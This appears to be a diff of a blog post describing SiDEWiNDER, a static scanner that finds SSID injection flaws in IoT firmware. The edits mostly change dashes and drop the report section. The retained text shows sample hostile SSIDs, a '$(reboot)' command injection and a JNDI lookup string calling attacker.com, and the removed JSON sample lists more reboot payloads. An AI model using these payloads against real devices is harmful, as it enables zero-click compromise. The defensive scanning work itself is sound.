@@ -5,7 +5,7 @@ description: "SiDEWiNDER is a static vulnerability scanner that detects SSID inj
 tags: ["iot", "firmware", "ssid injection", "vulnerability scanner", "security research", "wifi", "static analysis"]
 ---
 
-WiFi SSIDs are something most developers never think to sanitize. They look harmless — just a network name — but in the hands of an attacker, a crafted SSID like:
+WiFi SSIDs are something most developers never think to sanitize. They look harmless - just a network name - but in the hands of an attacker, a crafted SSID like:
 
 ```
 $(reboot)
@@ -19,7 +19,7 @@ ${jndi:ldap://attacker.com/exploit}
 
 can silently compromise an IoT device the moment it scans for networks. No user interaction. No password. No click. Pure zero-click exploitation.
 
-**SiDEWiNDER** (SSID Injection Detection & Wireless INjection Defense EngineeR) is a static vulnerability scanner purpose-built to find these exact issues in IoT firmware, source code, and ELF binaries — before they ship.
+**SiDEWiNDER** (SSID Injection Detection & Wireless INjection Defense EngineeR) is a static vulnerability scanner purpose-built to find these exact issues in IoT firmware, source code, and ELF binaries - before they ship.
 
 This blog walks through the architecture, detection logic, rule engine, and scanning internals of SiDEWiNDER in full technical detail.
 
@@ -27,7 +27,7 @@ This blog walks through the architecture, detection logic, rule engine, and scan
 
 ### <span style="color: orange;">The Problem: Why SSIDs Are a Dangerous Attack Surface</span>
 
-Modern IoT devices — routers, cameras, smart home hubs, industrial sensors — all perform WiFi scanning. During a scan, the device receives beacon frames from nearby access points. Each beacon contains the SSID — a raw, attacker-controlled string up to 32 bytes long.
+Modern IoT devices - routers, cameras, smart home hubs, industrial sensors - all perform WiFi scanning. During a scan, the device receives beacon frames from nearby access points. Each beacon contains the SSID - a raw, attacker-controlled string up to 32 bytes long.
 
 Most firmware trusts this string implicitly:
 
@@ -76,8 +76,6 @@ sidewinder/
 │       ├── wifi_cmd.json     # 14 vulnerability class rule files
 │       ├── wifi_overflow.json
 │       └── ...
-└── report/
-    └── generator.py          # HTML + JSON report generation
 ```
 
 The tool has four independent scanning engines that can be run individually or all at once via the `full` command:
@@ -90,7 +88,7 @@ python3 cli.py full /path/to/target
 
 ### <span style="color: orange;">The Rule Engine</span>
 
-Every vulnerability class in SiDEWiNDER is defined by a JSON rule file under `config/rules/`. Rules are self-contained and the scanner auto-loads all files matching `wifi_*.json` at startup — no hardcoded class list.
+Every vulnerability class in SiDEWiNDER is defined by a JSON rule file under `config/rules/`. Rules are self-contained and the scanner auto-loads all files matching `wifi_*.json` at startup - no hardcoded class list.
 
 **Rule Schema**
 
@@ -185,7 +183,7 @@ This maps directly to the `source_patterns` keys in each rule file, so a `.c` fi
 
 Each file goes through two phases:
 
-Phase 1: Single-line scan — every non-comment line is tested against all compiled regexes for the file's language:
+Phase 1: Single-line scan - every non-comment line is tested against all compiled regexes for the file's language:
 
 ```python
 for line_num, line in enumerate(lines, start=1):
@@ -199,7 +197,7 @@ for line_num, line in enumerate(lines, start=1):
             # ... create finding
 ```
 
-Phase 2: Multi-line sliding window — some vulnerability patterns span multiple lines. For example:
+Phase 2: Multi-line sliding window - some vulnerability patterns span multiple lines. For example:
 
 ```c
 strcpy(local_ssid,
@@ -310,7 +308,7 @@ The same line cannot generate two findings for the same vulnerability class, eve
 
 ### <span style="color: orange;">Binary Analyzer</span>
 
-The `BinaryAnalyzer` class (`core/binary_analyzer.py`) handles compiled ELF binaries — the actual executables found inside IoT firmware.
+The `BinaryAnalyzer` class (`core/binary_analyzer.py`) handles compiled ELF binaries - the actual executables found inside IoT firmware.
 
 **ELF Architecture Detection**
 
@@ -372,7 +370,7 @@ Binary confidence is based on the number of SSID context string hits:
 
 ### <span style="color: orange;">Firmware Extractor</span>
 
-The `FirmwareExtractor` class (`core/firmware_extractor.py`) handles raw firmware images — the `.bin` files downloaded from vendor websites or extracted from physical devices.
+The `FirmwareExtractor` class (`core/firmware_extractor.py`) handles raw firmware images - the `.bin` files downloaded from vendor websites or extracted from physical devices.
 
 **Extraction via unblob**
 
@@ -466,40 +464,6 @@ The `manifest_only` flag prevents npm packages like `systeminformation` from gen
 
 ---
 
-### <span style="color: orange;">Report Generation</span>
-
-SiDEWiNDER generates two report formats via `report/generator.py`:
-
-**JSON Report**
-
-Machine-readable output with full finding metadata:
-
-```json
-{
-  "file": "src/wifi_manager.c",
-  "line": 42,
-  "content": "system(cmd);",
-  "class": "wifi_cmd",
-  "severity": "critical",
-  "confidence": "confirmed",
-  "cwe": "CWE-78",
-  "zero_click": true,
-  "cves": ["CVE-2023-42810"],
-  "payloads": ["|reboot|", "$(reboot)", ";reboot;"]
-}
-```
-
-**HTML Report**
-
-Dark-themed report with:
-- Severity badges (CRITICAL / HIGH / MEDIUM / LOW)
-- Confidence indicators
-- CVE cross-references
-- Sortable tables per scanner (source, binary, dependency)
-- Per-class vulnerability breakdown
-
----
-
 ### <span style="color: orange;">Usage Examples</span>
 
 Scan source code:
@@ -529,15 +493,7 @@ python3 cli.py deps /path/to/project
 Run all scanners:
 
 ```bash
-python3 cli.py full /path/to/target -o ./reports
-```
-
-Output formats:
-
-```bash
-python3 cli.py scan /target -f json    # JSON only
-python3 cli.py scan /target -f html   # HTML only
-python3 cli.py scan /target -f both   # Both (default)
+python3 cli.py full /path/to/target
 ```
 
 ---
